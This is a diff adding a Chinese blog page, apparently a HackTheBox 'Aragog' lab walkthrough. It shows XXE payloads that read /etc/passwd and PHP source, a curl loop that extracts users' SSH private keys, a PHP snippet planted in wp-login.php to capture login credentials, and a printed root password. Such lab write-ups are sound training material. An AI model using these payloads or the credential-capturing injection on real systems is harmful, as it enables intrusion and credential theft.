@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="FTP允许匿名登陆，没有太有趣的文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Aragog">
+<meta property="og:url" content="http://evilarsene.icu/2021/06/01/HTB-Aragog/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="FTP允许匿名登陆，没有太有趣的文件">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Aragog/20.png">
+<meta property="article:published_time" content="2021-06-01T14:30:47.000Z">
+<meta property="article:modified_time" content="2021-06-02T14:42:58.980Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Linux靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Aragog/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2021/06/01/HTB-Aragog/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:Aragog | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2021/06/01/HTB-Aragog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box">">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:Aragog
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-01 22:30:47" itemprop="dateCreated datePublished" datetime="2021-06-01T22:30:47+08:00">2021-06-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-02 22:42:58" itemprop="dateModified" datetime="2021-06-02T22:42:58+08:00">2021-06-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Aragog/1.png" alt="1"></p>
+<p>FTP允许匿名登陆，没有太有趣的文件</p>
+<p><img src="/images/Aragog/2.png" alt="2"></p>
+<p>Web枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.78&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-medium-directories.txt -n -x php html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Aragog/3.png" alt="3"></p>
+<p>发现了<code>hosts.php</code></p>
+<p><img src="/images/Aragog/4.png" alt="4"></p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>我们发现<code>hosts.php</code>疑似缺少一些参数，考虑到ftp里发现了XML文件，尝试发送POST请求给该接口</p>
+<p>成功得到响应</p>
+<p><img src="/images/Aragog/5.png" alt="5"></p>
+<p>尝试修改参数，发现可以随意控制</p>
+<p><img src="/images/Aragog/6.png" alt="6"></p>
+<p>可以猜到后台会读取我们传递的XML文件，这里考虑XXE漏洞</p>
+<p>尝试传递payload验证漏洞存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;evil&quot;&gt; ]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;example;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Aragog/7.png" alt="7"></p>
+<p>看来XXE漏洞存在，尝试引入外部DTD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE evil[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Aragog/8.png" alt="8"></p>
+<p>可以进行文件读取</p>
+<p>有了文件读取，我首先想要做的是读取当前页面的源代码，因为它是PHP站点，可以使用<code>php filter</code>进行源码获取，尝试猜测网站页面位置为<code>/var/www/html/hosts.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE evil[</span><br><span class="line">&lt;!ELEMENT evil ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;hosts.php&quot;&gt;]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Aragog/9.png" alt="9"></p>
+<p>解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $details = simplexml_import_dom($dom);</span><br><span class="line">    $mask = $details-&gt;subnet_mask;</span><br><span class="line">    <span class="comment">//echo &quot;\r\nYou have provided subnet $mask\r\n&quot;;</span></span><br><span class="line"></span><br><span class="line">    $max_bits = <span class="string">&#x27;32&#x27;</span>;</span><br><span class="line">    $cidr = mask2cidr($mask);</span><br><span class="line">    $bits = $max_bits - $cidr;</span><br><span class="line">    $hosts = pow(<span class="number">2</span>,$bits);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\r\nThere are &quot;</span> . ($hosts - <span class="number">2</span>) . <span class="string">&quot; possible hosts for <span class="subst">$mask</span>\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mask2cidr</span>(<span class="params">$mask</span>)</span>&#123;  </span><br><span class="line">         $long = ip2long($mask);  </span><br><span class="line">         $base = ip2long(<span class="string">&#x27;255.255.255.255&#x27;</span>);  </span><br><span class="line">         <span class="keyword">return</span> <span class="number">32</span>-log(($long ^ $base)+<span class="number">1</span>,<span class="number">2</span>);       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用DOMDocument(基于libxml库)解析XML，没有进行任何限制，导致XXE漏洞</p>
+<p>xxe一般很难获取RCE，比如php默认禁用的<code>expect</code>，所以我们尝试读取一些能获得shell的文件，比如<code>id_rsa</code></p>
+<p>选出之前passwd中的普通用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat passwd |grep -vE &quot;false|nologin&quot; | awk -F &quot;:&quot; &#39;&#123;print $1&#125;&#39;</span><br><span class="line">sync</span><br><span class="line">florian</span><br><span class="line">cliff</span><br></pre></td></tr></table></figure>
+
+<p>使用一个for循环快速遍历所有用户的id_rsa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for name in $(echo sync florian cliff);do curl -s http:&#x2F;&#x2F;10.10.10.78&#x2F;hosts.php -x http:&#x2F;&#x2F;127.0.0.1:8080 -d &#39;&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE evil[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;&#x2F;home&#x2F;&#39;$name&#39;&#x2F;.ssh&#x2F;id_rsa&quot;&gt;]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;&#x2F;subnet_mask&gt;</span><br><span class="line">    &lt;test&gt;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;details&gt;&#39;;done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Aragog/10.png" alt="10"></p>
+<p>使用私钥登陆即可</p>
+<p><img src="/images/Aragog/11.png" alt="11"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现Web目录可以任意读写，这是不寻常的</p>
+<p><img src="/images/Aragog/12.png" alt="12"></p>
+<p>发现两个目录枚举没有发现的东西</p>
+<p><img src="/images/Aragog/13.png" alt="13"></p>
+<p>其中一个是wordpress站点，另一个不具有读写权限。添加hosts</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.78     aragog</span><br></pre></td></tr></table></figure>
+
+<p>wordpress站点得到blog，解释了zz_backup有可能是网站的备份</p>
+<p><img src="/images/Aragog/14.png" alt="14"></p>
+<p>由于这是<code>wordpress</code>，所以可以从<code>wp-config.php</code>中得到mysql密码</p>
+<p><img src="/images/Aragog/15.png" alt="15"></p>
+<p>得到管理员密码</p>
+<p><img src="/images/Aragog/16.png" alt="16"></p>
+<p>不过该哈希无法破解</p>
+<p>使用pspy寻找可疑的进程</p>
+<p><img src="/images/Aragog/17.png" alt="17"></p>
+<p>发现进程<code>wp-login.py</code>，看起来该脚本像有人在不断尝试登陆，当前用户没有<code>tcpdump</code>的执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:&#x2F;var&#x2F;www&#x2F;html&#x2F;dev_wiki$ tcpdump </span><br><span class="line">tcpdump: ens33: You don&#39;t have permission to capture on that device</span><br><span class="line">(socket: Operation not permitted)</span><br></pre></td></tr></table></figure>
+
+<p>但具有修改<code>wordpress</code>下文件的权限，所以我决定在<code>wp-login.php</code>中添加如下内容，这样我就可以抓取登陆的凭据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">file_put_contents(&quot;&#x2F;tmp&#x2F;cred.txt&quot;,$content,FILE_APPEND);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Aragog/18.png" alt="18"></p>
+<p>成功抓取到</p>
+<p><img src="/images/Aragog/19.png" alt="19"></p>
+<p>解码</p>
+<p><img src="/images/Aragog/20.png" alt="20"></p>
+<p>这就是root的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:&#x2F;tmp$ su root</span><br><span class="line">Password: !KRgYs(JFO!&amp;MTr)lf</span><br><span class="line">root@aragog:&#x2F;tmp# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@aragog:&#x2F;tmp# </span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E9%9D%B6%E6%9C%BA/" rel="tag"># Linux靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/01/HTB-Compromised/" rel="prev" title="HTB:Compromised">
+      <i class="fa fa-chevron-left"></i> HTB:Compromised
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/02/HTB-Stratosphere/" rel="next" title="HTB:Stratosphere">
+      HTB:Stratosphere <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">166</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+(diffYears-2)+" 年 "+diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+
+<script>
+console.log(`%c
+. . . . . . . . . . . . . . . . . . . . . . . . . . .
+.                                                   .
+.                      uuuuuuu                      .
+.                  uu$$$$$$$$$$$uu                  .
+.               uu$$$$$$$$$$$$$$$$$uu               .
+.              u$$$$$$$$$$$$$$$$$$$$$u              .
+.             u$$$$$$$$$$$$$$$$$$$$$$$u             .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$"   "$$$"   "$$$$$$u            .
+.            "$$$$"      u$u       $$$$"            .
+.             $$$u       u$u       u$$$             .
+.             $$$u      u$$$u      u$$$             .
+.              "$$$$uu$$$   $$$uu$$$$"              .
+.               "$$$$$$$"   "$$$$$$$"               .
+.                 u$$$$$$$u$$$$$$$u                 .
+.                  u$"$"$"$"$"$"$u                  .
+.       uuu        $$u$ $ $ $ $u$$       uuu        .
+.      u$$$$        $$$$$u$u$u$$$       u$$$$       .
+.       $$$$$uu      "$$$$$$$$$"     uu$$$$$$       .
+.     u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$     .
+.     $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"     .
+.      """      ""$$$$$$$$$$$uu ""$"""              .
+.                uuuu ""$$$$$$$$$$uuu               .
